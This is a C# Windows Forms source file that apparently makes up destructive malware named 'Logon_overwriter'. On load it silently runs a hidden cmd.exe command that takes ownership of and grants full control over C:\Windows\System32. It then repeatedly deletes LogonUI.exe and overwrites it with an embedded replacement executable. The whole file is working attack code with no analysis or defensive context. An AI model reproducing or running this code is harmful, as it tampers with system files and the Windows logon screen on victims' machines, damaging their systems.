using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;

namespace Logon_overwriter
{
    public partial class Logon : Form
    {
        public Logon()
        {
            InitializeComponent();
            this.TransparencyKey = BackColor;
        }
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //Important.DO NOT CHANGE!!!

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }

        bool logon_check = true;

        private void Logon_Load(object sender, EventArgs e)
        {
            const string quote = "\"";
            ProcessStartInfo logon = new ProcessStartInfo();
            logon.FileName = "cmd.exe";
            logon.WindowStyle = ProcessWindowStyle.Hidden;
            logon.Arguments = @"/k takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant " + quote + "%username%:F" + quote;
            Process.Start(logon);
            string LogonUI = @"C:\Windows\System32\LogonUI.exe";
            while(File.Exists(LogonUI) && logon_check)
            {
                try
                {
                    File.Delete(LogonUI);
                }
                catch(Exception ex){}
                if(!File.Exists(LogonUI))
                {
                    logon_check = false;
                    Extract("Logon_overwriter", @"C:\Windows\System32", "Resources", "LogonUI.exe");
                    this.Close();
                    Application.Exit();
                }
            }
        }
    }
}
